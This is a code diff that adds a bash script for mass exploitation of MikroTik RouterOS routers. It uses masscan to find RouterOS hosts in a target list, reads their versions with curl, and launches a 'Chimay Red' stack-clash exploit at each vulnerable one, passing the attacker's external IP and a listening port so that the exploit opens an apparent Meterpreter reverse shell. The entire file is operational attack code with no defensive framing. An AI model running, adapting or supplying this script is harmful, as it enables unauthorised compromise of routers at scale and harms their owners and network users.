@@ -1,0 +1,102 @@
+#!/bin/bash
+
+# Masscan and curl settings
+SCANRATE=1000
+TIMEOUT=3
+MAX_TIMEOUT=10
+
+# Chimay Red settings
+BINARY_STORAGE="/root/mikrotik/binaries"
+ARCH="mipsbe"
+BINARY="www"
+LPORT=9876
+
+usage() {
+	echo "Usage: $(basename $0) <scanlist_file> [ports]"
+	exit 0
+}
+
+error() {
+	echo "Error: $1"
+	exit 1
+}
+
+# $1 = host:port
+ros_version() {
+	curl --connect-timeout $TIMEOUT -m $MAX_TIMEOUT $1 2>/dev/null | grep -o '<h1>[^<]*<\/h1>' | sed -E 's/<[/]?h1>//g' | grep 'RouterOS' | cut -d' ' -f2 | cut -c2-
+}
+
+get_external_ip() {
+	echo $(dig +short myip.opendns.com @resolver1.opendns.com)
+}
+
+[ "$1" == "" ] && usage
+[ -f "$1" ] || error "file $1 doesn't exist"
+
+# Parse arguments
+SCANLIST="$1"
+[ "$2" == "" ] && PORTS=80 || PORTS="$2"
+
+results=$(mktemp)
+masscan -iL $SCANLIST -p$PORTS --banners -oG $results --rate $SCANRATE
+
+# host port
+hosts=$(grep 'Banner: RouterOS' $results | awk '{print $2":"$5}')
+_hosts=($hosts)
+hosts_found=${#_hosts[@]}
+echo -e "\nFound hosts with RouterOS: $hosts_found\n"
+rm $results
+
+# Multithreaded version scan
+THREADDIR=`mktemp -d`
+MAXTHREADS=50
+pid=1
+DELAY=0.1
+
+echo "[*] Getting RouterOS versions for the targets"
+targets=$(mktemp)
+for h in $hosts; do
+	while [ -f $THREADDIR/$pid ]; do
+		if [ $pid -eq $MAXTHREADS ]; then
+			pid=0
+		fi
+		sleep $DELAY
+		pid=$[$pid+1]
+	done
+
+	touch "$THREADDIR/$pid"
+	{
+		v=$(ros_version $h)
+		echo "[*] Target = $h, version = $v"
+		echo "$h:$v" >> $targets
+		rm "$THREADDIR/$pid"
+	} &
+done
+wait
+
+LHOST=$(get_external_ip)
+echo -e "\n[*] Setting LHOST=$LHOST LPORT=$LPORT\n"
+# host:port:version
+for t in $(cat $targets); do
+	rhost=$(echo $t | cut -d: -f1)
+	rport=$(echo $t | cut -d: -f2)
+	version=$(echo $t | cut -d: -f3)
+
+	if [ "$version" != "" ]; then
+		good_version=$(echo $version | grep -vE '^5|^6\.4.|^6\.39|^6\.38\.[5-9]|rc')
+		if [ "$good_version" != "" ]; then
+			if [ -f "${BINARY_STORAGE}/${BINARY}.${version}.${ARCH}" ]; then
+				echo "[+] Starting Chimay Red for $rhost:$rport (version = $good_version)"
+				ChimayRedStackClash_mips_meterpreter.py $rhost $rport $BINARY_STORAGE/$BINARY.$version.$ARCH $LHOST $LPORT
+			else
+				echo "[-] The binary was not found (arch = $ARCH, binary = $BINARY, version = $good_version)"
+			fi
+		else
+			echo "[-] Bad version: $version ($rhost:$rport)"
+		fi
+	else
+		echo "[-] No version info has been found ($rhost:$rport)"
+	fi
+done
+
+rm $targets
